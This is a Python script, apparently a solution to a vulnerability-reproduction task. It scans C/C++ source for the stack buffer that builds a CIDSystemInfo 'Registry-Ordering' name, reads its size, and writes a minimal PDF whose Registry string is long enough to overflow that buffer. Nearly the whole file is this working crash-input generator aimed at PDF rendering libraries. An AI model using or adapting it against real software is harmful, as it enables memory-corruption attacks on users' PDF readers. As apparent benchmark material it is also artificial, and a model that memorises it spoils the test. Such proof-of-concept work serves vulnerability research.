import os
import re
import tarfile
from typing import Iterator, Optional, Tuple


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx",
            ".h", ".hh", ".hpp", ".hxx",
            ".m", ".mm",
        }

        def want(name: str) -> bool:
            ln = name.lower()
            return any(ln.endswith(e) for e in exts)

        def safe_read_file(path: str, limit: int = 2_000_000) -> Optional[bytes]:
            try:
                st = os.stat(path)
                if st.st_size <= 0 or st.st_size > limit:
                    return None
                with open(path, "rb") as f:
                    return f.read(limit + 1)
            except Exception:
                return None

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    if want(fn):
                        data = safe_read_file(p)
                        if data is not None and len(data) <= 2_000_000:
                            yield p, data
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        if not want(name):
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read(2_000_000 + 1)
                            if len(data) <= 2_000_000:
                                yield name, data
                        except Exception:
                            continue
            except Exception:
                return

    def _detect_fallback_buffer_size(self, src_path: str) -> Optional[int]:
        # Heuristically locate the destination stack buffer used to build "<Registry>-<Ordering>"
        # from CIDSystemInfo and extract its declared size.
        # Returns a plausible buffer size if found.
        pat_fmt = re.compile(
            r'(?:\b(?:sprint|snprint)f|\bfz_snprintf|\bgs_snprintf)\s*\(\s*([A-Za-z_]\w*)\s*,[^;]*?"[^"]*%s[^"]*-[^"]*%s',
            re.DOTALL,
        )
        pat_arr = re.compile(r'\bchar\s+([A-Za-z_]\w*)\s*\[\s*(\d+)\s*\]')
        pat_memcpy = re.compile(r'\bmemcpy\s*\(\s*([A-Za-z_]\w*)\s*,')
        pat_strcpy = re.compile(r'\bstrcpy\s*\(\s*([A-Za-z_]\w*)\s*,')
        pat_strcat = re.compile(r'\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,')
        pat_cid_keywords = (b"CIDSystemInfo", b"Registry", b"Ordering")

        candidates = []

        for _, data in self._iter_source_files(src_path):
            if not (pat_cid_keywords[0] in data or (pat_cid_keywords[1] in data and pat_cid_keywords[2] in data)):
                continue
            try:
                text = data.decode("latin-1", "ignore")
            except Exception:
                continue
            if "Registry" not in text or "Ordering" not in text:
                continue

            # Strong signal: format string contains "%s-%s"
            for m in pat_fmt.finditer(text):
                dst = m.group(1)
                start = max(0, m.start() - 4000)
                end = min(len(text), m.end() + 4000)
                window = text[start:end]
                for am in pat_arr.finditer(window):
                    var, sz = am.group(1), int(am.group(2))
                    if var == dst and 16 <= sz <= 262144:
                        candidates.append(sz)

            # Medium signal: sequence of strcpy/strcat/memcpy around keywords
            if not candidates:
                for kwpos in (text.find("CIDSystemInfo"), text.find("Registry"), text.find("Ordering")):
                    if kwpos < 0:
                        continue
                    start = max(0, kwpos - 6000)
                    end = min(len(text), kwpos + 6000)
                    window = text[start:end]
                    if "-" not in window:
                        continue

                    dst_vars = set()
                    for mm in pat_memcpy.finditer(window):
                        dst_vars.add(mm.group(1))
                    for mm in pat_strcpy.finditer(window):
                        dst_vars.add(mm.group(1))
                    for mm in pat_strcat.finditer(window):
                        dst_vars.add(mm.group(1))

                    if not dst_vars:
                        continue

                    for am in pat_arr.finditer(window):
                        var, sz = am.group(1), int(am.group(2))
                        if var in dst_vars and 16 <= sz <= 262144:
                            # Prefer buffers with name-ish variables
                            score = 0
                            lv = var.lower()
                            if "fallback" in lv:
                                score += 6
                            if "name" in lv:
                                score += 4
                            if "collection" in lv:
                                score += 4
                            if "buf" in lv:
                                score += 2
                            if "cid" in lv:
                                score += 2
                            if score >= 2:
                                candidates.append(sz)

        if not candidates:
            return None
        candidates = sorted(set(candidates))
        # Choose the smallest plausible size
        return candidates[0]

    def _pdf_escape_literal(self, b: bytes) -> bytes:
        # Escape backslash and parentheses
        out = bytearray()
        for ch in b:
            if ch in (0x5C, 0x28, 0x29):  # \ ( )
                out.append(0x5C)
            out.append(ch)
        return bytes(out)

    def _build_pdf(self, reg: bytes, ord_: bytes) -> bytes:
        reg_lit = b"(" + self._pdf_escape_literal(reg) + b")"
        ord_lit = b"(" + self._pdf_escape_literal(ord_) + b")"

        stream_data = b"BT /F1 12 Tf 72 120 Td <0001> Tj ET\n"
        obj5 = b"<< /Length " + str(len(stream_data)).encode() + b" >>\nstream\n" + stream_data + b"endstream"

        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
        obj4 = b"<< /Type /Font /Subtype /Type0 /BaseFont /Dummy /Encoding /Identity-H /DescendantFonts [6 0 R] >>"
        obj6 = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy "
            b"/CIDSystemInfo << /Registry " + reg_lit + b" /Ordering " + ord_lit + b" /Supplement 0 >> "
            b"/FontDescriptor 7 0 R /DW 1000 /CIDToGIDMap /Identity >>"
        )
        obj7 = (
            b"<< /Type /FontDescriptor /FontName /Dummy /Flags 4 "
            b"/FontBBox [0 -200 1000 900] /ItalicAngle 0 /Ascent 800 /Descent -200 "
            b"/CapHeight 700 /StemV 80 >>"
        )

        objs = {
            1: obj1,
            2: obj2,
            3: obj3,
            4: obj4,
            5: obj5,
            6: obj6,
            7: obj7,
        }

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
        out = bytearray(header)
        offsets = {0: 0}
        max_obj = max(objs.keys())
        for i in range(1, max_obj + 1):
            offsets[i] = len(out)
            out += f"{i} 0 obj\n".encode()
            out += objs[i]
            out += b"\nendobj\n"

        xref_pos = len(out)
        out += b"xref\n"
        out += f"0 {max_obj + 1}\n".encode()
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj + 1):
            out += f"{offsets[i]:010d} 00000 n \n".encode()

        out += b"trailer\n"
        out += f"<< /Size {max_obj + 1} /Root 1 0 R >>\n".encode()
        out += b"startxref\n"
        out += f"{xref_pos}\n".encode()
        out += b"%%EOF\n"
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        buf_sz = self._detect_fallback_buffer_size(src_path)

        if buf_sz is None:
            reg_len = 70000
            ord_len = 32
        else:
            # Ensure overflow likely: make combined name exceed buffer.
            # Keep it reasonably small but above buffer.
            reg_len = max(1, buf_sz + 32)
            ord_len = 32

        reg = b"A" * reg_len
        ord_ = b"B" * ord_len
        return self._build_pdf(reg, ord_)